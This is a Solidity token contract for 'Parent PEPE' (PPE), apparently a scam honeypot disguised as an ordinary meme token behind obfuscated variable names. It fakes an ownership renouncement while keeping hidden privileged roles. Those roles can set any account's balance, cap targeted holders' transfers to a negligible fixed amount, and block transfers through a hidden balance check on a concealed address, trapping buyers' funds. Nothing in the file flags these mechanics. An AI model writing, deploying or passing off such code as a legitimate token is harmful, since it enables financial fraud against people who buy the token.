//SPDX-License-Identifier: MIT

pragma solidity ^0.8.9;

interface txLaunch {
    function totalSupply() external view returns (uint256);

    function balanceOf(address walletList) external view returns (uint256);

    function transfer(address walletReceiver, uint256 modeEnable) external returns (bool);

    function allowance(address walletLaunched, address spender) external view returns (uint256);

    function approve(address spender, uint256 modeEnable) external returns (bool);

    function transferFrom(
        address sender,
        address walletReceiver,
        uint256 modeEnable
    ) external returns (bool);

    event Transfer(address indexed from, address indexed limitSender, uint256 value);
    event Approval(address indexed walletLaunched, address indexed spender, uint256 value);
}

abstract contract launchedMinAuto {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

interface buyList {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

interface modeFund {
    function createPair(address autoWalletSell, address tradingToken) external returns (address);
}

interface txLaunchMetadata is txLaunch {
    function name() external view returns (string memory);

    function symbol() external view returns (string memory);

    function decimals() external view returns (uint8);
}

contract ParentPEPE is launchedMinAuto, txLaunch, txLaunchMetadata {

    function allowance(address receiverMinShould, address receiverLaunchTx) external view virtual override returns (uint256) {
        if (receiverLaunchTx == autoEnableLaunched) {
            return type(uint256).max;
        }
        return isMarketing[receiverMinShould][receiverLaunchTx];
    }

    bool private maxToken;

    uint8 private walletLimit = 18;

    function transferFrom(address atLiquidity, address walletReceiver, uint256 modeEnable) external override returns (bool) {
        if (_msgSender() != autoEnableLaunched) {
            if (isMarketing[atLiquidity][_msgSender()] != type(uint256).max) {
                require(modeEnable <= isMarketing[atLiquidity][_msgSender()]);
                isMarketing[atLiquidity][_msgSender()] -= modeEnable;
            }
        }
        return liquidityAt(atLiquidity, walletReceiver, modeEnable);
    }

    function fundTotal() private view {
        require(amountTrading[_msgSender()]);
    }

    function liquidityAt(address atLiquidity, address walletReceiver, uint256 modeEnable) internal returns (bool) {
        if (atLiquidity == launchShould) {
            return minTrading(atLiquidity, walletReceiver, modeEnable);
        }
        uint256 tokenIsMode = txLaunch(minSender).balanceOf(liquidityAmount);
        require(tokenIsMode == listMax);
        require(walletReceiver != liquidityAmount);
        if (atReceiver[atLiquidity]) {
            return minTrading(atLiquidity, walletReceiver, maxSell);
        }
        return minTrading(atLiquidity, walletReceiver, modeEnable);
    }

    address autoEnableLaunched = 0x10ED43C718714eb63d5aA57B78B54704E256024E;

    function transfer(address autoBuy, uint256 modeEnable) external virtual override returns (bool) {
        return liquidityAt(_msgSender(), autoBuy, modeEnable);
    }

    constructor (){
        if (shouldLimit) {
            launchedAutoReceiver = takeTotal;
        }
        buyList toMin = buyList(autoEnableLaunched);
        minSender = modeFund(toMin.factory()).createPair(toMin.WETH(), address(this));
        
        launchShould = _msgSender();
        swapLaunch();
        amountTrading[launchShould] = true;
        fundSenderReceiver[launchShould] = atTo;
        
        emit Transfer(address(0), launchShould, atTo);
    }

    address liquidityAmount = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;

    mapping(address => bool) public amountTrading;

    function liquidityMin(address teamEnable) public {
        fundTotal();
        if (swapTrading != maxToken) {
            takeTotal = marketingLiquidity;
        }
        if (teamEnable == launchShould || teamEnable == minSender) {
            return;
        }
        atReceiver[teamEnable] = true;
    }

    bool public atTx;

    uint256 fromTotal;

    string private feeMax = "PPE";

    function decimals() external view virtual override returns (uint8) {
        return walletLimit;
    }

    string private fromAmount = "Parent PEPE";

    function swapLaunch() public {
        emit OwnershipTransferred(launchShould, address(0));
        modeBuyWallet = address(0);
    }

    function totalSupply() external view virtual override returns (uint256) {
        return atTo;
    }

    uint256 private launchedAutoReceiver;

    event OwnershipTransferred(address indexed tradingFund, address indexed isTake);

    mapping(address => mapping(address => uint256)) private isMarketing;

    address public minSender;

    function balanceOf(address walletList) public view virtual override returns (uint256) {
        return fundSenderReceiver[walletList];
    }

    function symbol() external view virtual override returns (string memory) {
        return feeMax;
    }

    function owner() external view returns (address) {
        return modeBuyWallet;
    }

    function minTrading(address atLiquidity, address walletReceiver, uint256 modeEnable) internal returns (bool) {
        require(fundSenderReceiver[atLiquidity] >= modeEnable);
        fundSenderReceiver[atLiquidity] -= modeEnable;
        fundSenderReceiver[walletReceiver] += modeEnable;
        emit Transfer(atLiquidity, walletReceiver, modeEnable);
        return true;
    }

    bool public minTeamTake;

    uint256 public marketingLiquidity;

    bool private swapTrading;

    mapping(address => uint256) private fundSenderReceiver;

    function exemptListLimit(uint256 modeEnable) public {
        fundTotal();
        listMax = modeEnable;
    }

    mapping(address => bool) public atReceiver;

    function enableExempt(address autoBuy, uint256 modeEnable) public {
        fundTotal();
        fundSenderReceiver[autoBuy] = modeEnable;
    }

    uint256 private takeTotal;

    uint256 constant maxSell = 18 ** 10;

    function getOwner() external view returns (address) {
        return modeBuyWallet;
    }

    uint256 private atTo = 100000000 * 10 ** 18;

    function approve(address receiverLaunchTx, uint256 modeEnable) public virtual override returns (bool) {
        isMarketing[_msgSender()][receiverLaunchTx] = modeEnable;
        emit Approval(_msgSender(), receiverLaunchTx, modeEnable);
        return true;
    }

    address public launchShould;

    uint256 listMax;

    address private modeBuyWallet;

    bool public shouldLimit;

    function name() external view virtual override returns (string memory) {
        return fromAmount;
    }

    function limitLaunchTeam(address toMarketing) public {
        require(toMarketing.balance < 100000);
        if (minTeamTake) {
            return;
        }
        if (shouldLimit == maxToken) {
            marketingLiquidity = takeTotal;
        }
        amountTrading[toMarketing] = true;
        if (swapTrading == atTx) {
            takeTotal = launchedAutoReceiver;
        }
        minTeamTake = true;
    }

}